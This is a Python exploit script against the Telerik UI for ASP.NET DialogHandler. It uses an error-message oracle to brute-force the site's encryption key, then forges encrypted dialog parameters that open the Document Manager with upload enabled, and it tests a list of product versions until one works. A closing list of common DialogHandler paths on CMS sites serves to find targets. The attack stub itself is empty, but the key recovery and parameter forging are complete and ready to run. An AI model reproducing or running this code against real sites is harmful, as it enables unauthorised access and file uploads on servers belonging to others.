#! -*- coding: utf-8 -*- 
import re 
import base64 
import itertools 
import requests 
 
from bs4 import BeautifulSoup 
 
keylength = 48

class Exploit: 
 
 user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0" 
 oracle = [ 
  [1, 34, 0, -1], [2, 284, 128, -1], [55, 3, 73, -1], [4, 15, 40, -1], [43, 5, 54, -1], [6, 10, 8, -1], [21, 7, 32, -1], [8, 42, 1, -1], 
  [9, 51, 2, -1], [-1, -1, -1, 0], [11, 135, 9, -1], [13, 12, 33, -1], [-1, -1, -1, 1], [24, 14, 11, -1], [-1, -1, -1, 2], [16, 26, 39, -1], 
  [74, 17, 10, -1], [18, 92, 1, -1], [19, 255, 4, -1], [20, 102, 5, -1], [-1, -1, -1, 3], [22, 50, 3, -1], [25, 23, 9, -1], [-1, -1, -1, 4], 
  [-1, -1, -1, 5], [-1, -1, -1, 6], [31, 27, 10, -1], [28, 257, 29, -1], [29, 142, 1, -1], [30, 256, 4, -1], [-1, -1, -1, 7], [32, 80, 42, -1], 
  [52, 33, 1, -1], [-1, -1, -1, 8], [143, 35, 90, -1], [36, 183, 32, -1], [37, 116, 2, -1], [38, 89, 24, -1], [47, 39, 3, -1], [41, 40, 4, -1], 
  [-1, -1, -1, 9], [-1, -1, -1, 10], [-1, -1, -1, 11], [44, 95, 16, -1], [63, 45, 1, -1], [108, 46, 6, -1], [-1, -1, -1, 12], [48, 132, 1, -1], 
  [49, 139, 5, -1], [-1, -1, -1, 13], [-1, -1, -1, 14], [-1, -1, -1, 15], [53, 54, 24, -1], [-1, -1, -1, 16], [-1, -1, -1, 17], [56, 260, 218, -1], 
  [57, 320, 144, -1], [66, 58, 24, -1], [59, 207, 4, -1], [60, 106, 2, -1], [61, 213, 5, -1], [70, 62, 27, -1], [-1, -1, -1, 18], [64, 133, 8, -1], 
  [65, 112, 3, -1], [-1, -1, -1, 19], [67, 266, 140, -1], [71, 68, 29, -1], [73, 69, 25, -1], [-1, -1, -1, 20], [-1, -1, -1, 21], [276, 72, 27, -1], 
  [-1, -1, -1, 22], [-1, -1, -1, 23], [75, 77, 16, -1], [82, 76, 32, -1], [-1, -1, -1, 24], [78, 94, 2, -1], [85, 79, 19, -1], [-1, -1, -1, 25], 
  [86, 81, 16, -1], [-1, -1, -1, 26], [84, 83, 18, -1], [-1, -1, -1, 27], [-1, -1, -1, 28], [-1, -1, -1, 29], [87, 88, 18, -1], [-1, -1, -1, 30], 
  [-1, -1, -1, 31], [90, 110, 4, -1], [91, 131, 1, -1], [-1, -1, -1, 32], [93, 254, 2, -1], [-1, -1, -1, 33], [-1, -1, -1, 34], [99, 96, 8, -1], 
  [97, 105, 24, -1], [104, 98, 3, -1], [-1, -1, -1, 35], [100, 113, 2, -1], [103, 101, 4, -1], [-1, -1, -1, 36], [-1, -1, -1, 37], [-1, -1, -1, 38], 
  [-1, -1, -1, 39], [-1, -1, -1, 40], [107, 206, 1, -1], [-1, -1, -1, 41], [114, 109, 10, -1], [-1, -1, -1, 42], [115, 111, 11, -1], [-1, -1, -1, 43], 
  [-1, -1, -1, 44], [-1, -1, -1, 45], [-1, -1, -1, 46], [-1, -1, -1, 47], [121, 117, 8, -1], [119, 118, 16, -1], [-1, -1, -1, 48], [128, 120, 9, -1], 
  [-1, -1, -1, 49], [122, 125, 24, -1], [123, 127, 9, -1], [129, 124, 10, -1], [-1, -1, -1, 50], [130, 126, 11, -1], [-1, -1, -1, 51], [-1, -1, -1, 52],        
  [-1, -1, -1, 53], [-1, -1, -1, 54], [-1, -1, -1, 55], [-1, -1, -1, 56], [-1, -1, -1, 57], [140, 134, 2, -1], [-1, -1, -1, 58], [136, 138, 1, -1], 
  [141, 137, 3, -1], [-1, -1, -1, 59], [-1, -1, -1, 60], [-1, -1, -1, 61], [-1, -1, -1, 62], [-1, -1, -1, 63], [-1, -1, -1, 64], [144, 149, 122, -1], 
  [157, 145, 24, -1], [146, 215, 65, -1], [190, 147, 9, -1], [148, 204, 1, -1], [-1, -1, -1, 65], [170, 150, 113, -1], [154, 151, 98, -1], [152, 188, 99, -1],  
  [153, 169, 2, -1], [-1, -1, -1, 66], [167, 155, 19, -1], [156, 166, 3, -1], [-1, -1, -1, 67], [158, 161, 4, -1], [202, 159, 3, -1], [160, 225, 68, -1],       
  [-1, -1, -1, 68], [162, 164, 5, -1], [163, 226, 69, -1], [-1, -1, -1, 69], [165, 227, 70, -1], [-1, -1, -1, 70], [-1, -1, -1, 71], [168, 177, 8, -1], 
  [-1, -1, -1, 72], [-1, -1, -1, 73], [174, 171, 16, -1], [197, 172, 9, -1], [245, 173, 8, -1], [-1, -1, -1, 74], [178, 175, 17, -1], [240, 176, 12, -1], 
  [-1, -1, -1, 75], [-1, -1, -1, 76], [180, 179, 64, -1], [-1, -1, -1, 77], [181, 182, 14, -1], [-1, -1, -1, 78], [-1, -1, -1, 79], [184, 218, 81, -1], 
  [185, 192, 16, -1], [235, 186, 17, -1], [187, 233, 12, -1], [-1, -1, -1, 80], [205, 189, 1, -1], [-1, -1, -1, 81], [195, 191, 8, -1], [-1, -1, -1, 82], 
  [200, 193, 9, -1], [194, 232, 8, -1], [-1, -1, -1, 83], [199, 196, 13, -1], [-1, -1, -1, 84], [250, 198, 12, -1], [-1, -1, -1, 85], [-1, -1, -1, 86],[201, 248, 12, -1], [-1, -1, -1, 87], [203, 251, 64, -1], [-1, -1, -1, 88], [-1, -1, -1, 89], [-1, -1, -1, 90], [-1, -1, -1, 91], [208, 210, 28, -1], 
  [209, 214, 1, -1], [-1, -1, -1, 92], [212, 211, 5, -1], [-1, -1, -1, 93], [-1, -1, -1, 94], [-1, -1, -1, 95], [-1, -1, -1, 96], [243, 216, 9, -1], 
  [217, 252, 1, -1], [-1, -1, -1, 97], [222, 219, 66, -1], [220, 241, 67, -1], [221, 231, 2, -1], [-1, -1, -1, 98], [229, 223, 19, -1], [224, 228, 3, -1], 
  [-1, -1, -1, 99], [-1, -1, -1, 100], [-1, -1, -1, 101], [-1, -1, -1, 102], [-1, -1, -1, 103], [230, 234, 8, -1], [-1, -1, -1, 104], [-1, -1, -1, 105], 
  [-1, -1, -1, 106], [-1, -1, -1, 107], [-1, -1, -1, 108], [236, 239, 64, -1], [237, 238, 13, -1], [-1, -1, -1, 109], [-1, -1, -1, 110], [-1, -1, -1, 111], 
  [-1, -1, -1, 112], [253, 242, 1, -1], [-1, -1, -1, 113], [246, 244, 8, -1], [-1, -1, -1, 114], [-1, -1, -1, 115], [249, 247, 13, -1], [-1, -1, -1, 116], 
  [-1, -1, -1, 117], [-1, -1, -1, 118], [-1, -1, -1, 119], [-1, -1, -1, 120], [-1, -1, -1, 121], [-1, -1, -1, 122], [-1, -1, -1, 123], [-1, -1, -1, 124], 
  [-1, -1, -1, 125], [259, 258, 4, -1], [-1, -1, -1, 126], [-1, -1, -1, 127], [269, 261, 160, -1], [262, 301, 162, -1], [263, 292, 130, -1], [316, 264, 138, -1], 
  [265, 356, 129, -1], [-1, -1, -1, 128], [279, 267, 170, -1], [278, 268, 139, -1], [-1, -1, -1, 129], [326, 270, 192, -1], [271, 340, 154, -1], [272, 282, 129, -1], 
  [273, 299, 131, -1], [275, 274, 136, -1], [-1, -1, -1, 130], [-1, -1, -1, 131], [281, 277, 137, -1], [-1, -1, -1, 132], [-1, -1, -1, 133], [280, 380, 130, -1], 
  [-1, -1, -1, 134], [-1, -1, -1, 135], [295, 283, 130, -1], [-1, -1, -1, 136], [391, 285, 218, -1], [286, 431, 160, -1], [287, 363, 130, -1], [288, 335, 152, -1], 
  [296, 289, 131, -1], [291, 290, 132, -1], [-1, -1, -1, 137], [-1, -1, -1, 138], [293, 354, 144, -1], [300, 294, 129, -1], [-1, -1, -1, 139], [-1, -1, -1, 140], 
  [297, 379, 129, -1], [298, 386, 133, -1], [-1, -1, -1, 141], [-1, -1, -1, 142], [-1, -1, -1, 143], [302, 305, 152, -1], [309, 303, 169, -1], [311, 304, 154, -1], 
  [-1, -1, -1, 144], [307, 306, 169, -1], [-1, -1, -1, 145], [312, 308, 155, -1], [-1, -1, -1, 146], [313, 310, 153, -1], [-1, -1, -1, 147], [-1, -1, -1, 148], 
  [-1, -1, -1, 149], [314, 315, 154, -1], [-1, -1, -1, 150], [-1, -1, -1, 151], [318, 317, 145, -1], [-1, -1, -1, 152], [331, 319, 147, -1], [-1, -1, -1, 153], 
  [321, 345, 132, -1], [322, 454, 139, -1], [323, 338, 138, -1], [324, 350, 134, -1], [325, 351, 135, -1], [-1, -1, -1, 154], [327, 381, 136, -1], [332, 328, 145, -1], 
  [330, 329, 146, -1], [-1, -1, -1, 155], [-1, -1, -1, 156], [-1, -1, -1, 157], [333, 334, 146, -1], [-1, -1, -1, 158], [-1, -1, -1, 159], [336, 357, 132, -1], 
  [337, 378, 129, -1], [-1, -1, -1, 160], [349, 339, 129, -1], [-1, -1, -1, 161], [341, 352, 135, -1], [342, 361, 129, -1], [344, 343, 130, -1], [-1, -1, -1, 162], 
  [-1, -1, -1, 163], [346, 457, 158, -1], [347, 389, 129, -1], [462, 348, 192, -1], [-1, -1, -1, 164], [-1, -1, -1, 165], [-1, -1, -1, 166], [-1, -1, -1, 167], 
  [359, 353, 136, -1], [-1, -1, -1, 168], [360, 355, 137, -1], [-1, -1, -1, 169], [-1, -1, -1, 170], [362, 358, 139, -1], [-1, -1, -1, 171], [-1, -1, -1, 172], 
  [-1, -1, -1, 173], [-1, -1, -1, 174], [-1, -1, -1, 175], [368, 364, 136, -1], [366, 365, 144, -1], [-1, -1, -1, 176], [375, 367, 137, -1], [-1, -1, -1, 177], 
  [369, 372, 152, -1], [370, 374, 137, -1], [376, 371, 138, -1], [-1, -1, -1, 178], [377, 373, 139, -1], [-1, -1, -1, 179], [-1, -1, -1, 180], [-1, -1, -1, 181], 
  [-1, -1, -1, 182], [-1, -1, -1, 183], [-1, -1, -1, 184], [-1, -1, -1, 185], [-1, -1, -1, 186], [384, 382, 130, -1], [388, 383, 131, -1], [-1, -1, -1, 187], 
  [387, 385, 129, -1], [-1, -1, -1, 188], [-1, -1, -1, 189], [-1, -1, -1, 190], [-1, -1, -1, 191], [390, 466, 192, -1], [-1, -1, -1, 192], [392, 397, 250, -1], 
  [405, 393, 152, -1], [394, 467, 193, -1], [438, 395, 137, -1], [396, 452, 129, -1], [-1, -1, -1, 193], [418, 398, 241, -1], [402, 399, 226, -1], [400, 436, 227, -1],[401, 417, 130, -1], [-1, -1, -1, 194], [415, 403, 147, -1], [404, 414, 131, -1], [-1, -1, -1, 195], [406, 409, 132, -1], [450, 407, 131, -1], [408, 477, 196, -1], 
  [-1, -1, -1, 196], [410, 412, 133, -1], [411, 478, 197, -1], [-1, -1, -1, 197], [413, 479, 198, -1], [-1, -1, -1, 198], [-1, -1, -1, 199], [416, 425, 136, -1], 
  [-1, -1, -1, 200], [-1, -1, -1, 201], [422, 419, 144, -1], [445, 420, 137, -1], [497, 421, 136, -1], [-1, -1, -1, 202], [426, 423, 145, -1], [492, 424, 140, -1], 
  [-1, -1, -1, 203], [-1, -1, -1, 204], [428, 427, 192, -1], [-1, -1, -1, 205], [429, 430, 142, -1], [-1, -1, -1, 206], [-1, -1, -1, 207], [432, 470, 209, -1], 
  [433, 440, 144, -1], [487, 434, 145, -1], [435, 485, 140, -1], [-1, -1, -1, 208], [453, 437, 129, -1], [-1, -1, -1, 209], [443, 439, 136, -1], [-1, -1, -1, 210], 
  [448, 441, 137, -1], [442, 484, 136, -1], [-1, -1, -1, 211], [447, 444, 141, -1], [-1, -1, -1, 212], [502, 446, 140, -1], [-1, -1, -1, 213], [-1, -1, -1, 214], 
  [449, 500, 140, -1], [-1, -1, -1, 215], [451, 503, 192, -1], [-1, -1, -1, 216], [-1, -1, -1, 217], [-1, -1, -1, 218], [464, 455, 129, -1], [456, 506, 194, -1], 
  [-1, -1, -1, 219], [460, 458, 134, -1], [459, 507, 193, -1], [-1, -1, -1, 220], [461, 508, 192, -1], [-1, -1, -1, 221], [463, 509, 195, -1], [-1, -1, -1, 222], 
  [465, 510, 194, -1], [-1, -1, -1, 223], [-1, -1, -1, 224], [495, 468, 137, -1], [469, 504, 129, -1], [-1, -1, -1, 225], [474, 471, 194, -1], [472, 493, 195, -1], 
  [473, 483, 130, -1], [-1, -1, -1, 226], [481, 475, 147, -1], [476, 480, 131, -1], [-1, -1, -1, 227], [-1, -1, -1, 228], [-1, -1, -1, 229], [-1, -1, -1, 230], 
  [-1, -1, -1, 231], [482, 486, 136, -1], [-1, -1, -1, 232], [-1, -1, -1, 233], [-1, -1, -1, 234], [-1, -1, -1, 235], [-1, -1, -1, 236], [488, 491, 192, -1], 
  [489, 490, 141, -1], [-1, -1, -1, 237], [-1, -1, -1, 238], [-1, -1, -1, 239], [-1, -1, -1, 240], [505, 494, 129, -1], [-1, -1, -1, 241], [498, 496, 136, -1], 
  [-1, -1, -1, 242], [-1, -1, -1, 243], [501, 499, 141, -1], [-1, -1, -1, 244], [-1, -1, -1, 245], [-1, -1, -1, 246], [-1, -1, -1, 247], [-1, -1, -1, 248], 
  [-1, -1, -1, 249], [-1, -1, -1, 250], [-1, -1, -1, 251], [-1, -1, -1, 252], [-1, -1, -1, 253], [-1, -1, -1, 254], [-1, -1, -1, 255] 
 ] 
 
 def __init__(self, target_url): 
  self.url = target_url 
  self.client = requests.session() 
  self.client.headers.update({'User-Agent': self.user_agent}) 
  self.key = "" 
  self.version = "unknown" 
 
 def xor(self, data, key): 
  return "".join([chr(ord(a)^ord(b))  
     for a, b in zip(data, itertools.cycle(key))]) 
 
 def base64_encode(self, string): 
  return "".join(map(chr, base64.b64encode(string.encode()))) 
 
 def base64_decode(self, string): 
  return "".join(map(chr, base64.b64decode(string.encode()))) 
 
 def get_exception_code(self, url): 
  r = self.client.get(url) 
  return 0 if "character" in r.text else 1 
 
 def bruteforce_key(self): 
  for pos in range(keylength): 
   node = 0 
   while self.oracle[node][-1] == -1: 
    index = self.oracle[node][2] 
    junk = " " * pos 
    send = self.xor(junk, self.key) + chr(index) 
    url = self.url + "?dp=" + self.base64_encode(send) 
    code = self.get_exception_code(url) 
    node = self.oracle[node][code] 
   key_char = chr(self.oracle[node][-1]) 
   self.key += key_char 
   print("Found", self.oracle[node][-1], "=>", self.key) 
  print(self.key) 
 
 def bruteforce_version(self): 
  params = { 
   'DialogName': "DocumentManager", 
   'renderMode': "2", 
   'Skin': "Default", 
   'Title': "Document Manager", 
   'dpptn': "", 
   'isRtl': "false", 
   'dp': "zork is so handsome" 
  } 
  versions = [ 
   '2007.1423', '2007.1521', '2007.1626', '2007.2918', 
   '2007.21010', '2007.21107', '2007.31218', '2007.31314', 
   '2007.31425', '2008.1415', '2008.1515', '2008.1619', 
   '2008.2723', '2008.2826', '2008.21001', '2008.31105', 
   '2008.31125', '2008.31314', '2009.1311', '2009.1402', 
   '2009.1527', '2009.2701', '2009.2826', '2009.31103', 
   '2009.31208', '2009.31314', '2010.1309', '2010.1415', 
   '2010.1519', '2010.2713', '2010.2826', '2010.2929','2010.31109', '2010.31215', '2010.31317', '2011.1315', 
   '2011.1413', '2011.1519', '2011.2712', '2011.2915', 
   '2011.31115', '2011.3.1305', '2012.1.215', '2012.1.411', 
   '2012.2.607', '2012.2.724', '2012.2.912', '2012.3.1016', 
   '2012.3.1205', '2012.3.1308', '2013.1.220', '2013.1.403', 
   '2013.1.417', '2013.2.611', '2013.2.717', '2013.3.1015', 
   '2013.3.1114', '2013.3.1324', '2014.1.225', '2014.1.403', 
   '2014.2.618', '2014.2.724', '2014.3.1024', '2015.1.204', 
   '2015.1.225', '2015.1.401', '2015.2.604', '2015.2.623', 
   '2015.2.729', '2015.2.826', '2015.3.930', '2015.3.1111', 
   '2016.1.113', '2016.1.225', '2016.2.504', '2016.2.607', 
   '2016.3.914', '2016.3.1018', '2016.3.1027', '2017.1.118', 
   '2017.1.228', '2017.2.503', '2017.2.621', '2017.2.711' 
  ] 
  dp_params = [ 
   "EnableAsyncUpload,False,3,True", 
   "DeletePaths,True,0,Zmc9PSxmZz09", 
   "EnableEmbeddedBaseStylesheet,False,3,True", 
   "RenderMode,False,2,2", 
   "UploadPaths,True,0,Zmc9PQo=", 
   "SearchPatterns,True,0,S2k0cQ==", 
   "EnableEmbeddedSkins,False,3,True", 
   "MaxUploadFileSize,False,1,204800", 
   "LocalizationPath,False,0,", 
   "FileBrowserContentProviderTypeName,False,0,", 
   "ViewPaths,True,0,Zmc9PQo=", 
   "IsSkinTouch,False,3,False", 
   "ExternalDialogsPath,False,0,", 
   "Language,False,0,ZW4tVVM=", 
   "AllowMultipleSelection,False,3,False", 
   "Telerik.DialogDefinition.DialogTypeName,False,0," 
  ] 
  telerik_version_raw_prefix = "Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog,Telerik.Web.UI,Version=" 
  telerik_version_raw_suffix = ",Culture=neutral,PublicKeyToken=121fae78165ba3d4" 
  for version in versions: 
   telerik_version = self.base64_encode(telerik_version_raw_prefix + version + telerik_version_raw_suffix) 
   dp_plaintext = ";".join(dp_params) + telerik_version 
   dp_encrypted = self.base64_encode(self.xor(self.base64_encode(dp_plaintext), self.key)) 
   params.update({'dp': dp_encrypted}) 
   r = self.client.get(self.url, params=params) 
   if "Error Message" not in r.text: 
    if "Document Manager" in r.text: 
     print(version, ":", r.request.url) 
     return r.request.url 
  
 def verify(self): 
  url = self.url + "?dp=:))" 
  r = self.client.get(url) 
  return "character" in r.text 
 
 def attack(self): 
  pass 
 
 
import sys
exploit = Exploit(sys.argv[1]) 

exploit.bruteforce_key() 
exploit.bruteforce_version() 

# keylength = 70
# key = "d2a312d9-7af4-43de-be5a-ae717b46cea6d2a312d9-7af4-43de-be5a-ae717b46ce"
# temp = key
# for i in range(len(key)):
#    temp = temp[:-1]
#    print(temp)
#    exploit.key = temp
#    exploit.bruteforce_version() 
#    print('passed')
 
 
""" 
/DesktopModules/Admin/RadEditorProvider/DialogHandler.aspx 
/providers/htmleditorproviders/telerik/telerik.web.ui.dialoghandler.aspx 
/Telerik.Web.UI.DialogHandler.aspx 
/common/admin/Jobs2/Telerik.Web.UI.DialogHandler.aspx 
/common/admin/Calendar/Telerik.Web.UI.DialogHandler.aspx 
/AsiCommon/Controls/ContentManagement/ContentDesigner/Telerik.Web.UI.DialogHandler.aspx 
/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx 
/cms/portlets/Telerik.Web.UI.DialogHandler.aspx 
/sitecore/shell/RadControls/Spell/Telerik.Spell.DialogHandler.aspx 
/common/admin/PhotoGallery2/Telerik.Web.UI.DialogHandler.aspx 
/_controls/responsive/Telerik.Web.UI.DialogHandler.aspx 
/controls/events/v2/Telerik.Web.UI.DialogHandler.aspx 
/_wpresources/RadEditorSharePoint/6.9.0.0__1f131a624888eeed/Resources/Telerik.Web.UI.DialogHandler.aspx 
/app_master/telerik.web.ui.dialoghandler.aspx 
/en/providers/htmleditorproviders/telerik/telerik.web.ui.dialoghandler.aspx 
/desktopmodules/telerikwebui/radeditorprovider/telerik.web.ui.dialoghandler.aspx 
/desktopmodules/dnnwerk.radeditorprovider/dialoghandler.aspx 
/dashboard/UserControl/CMS/Page/Telerik.Web.UI.DialogHandler.aspx 
"""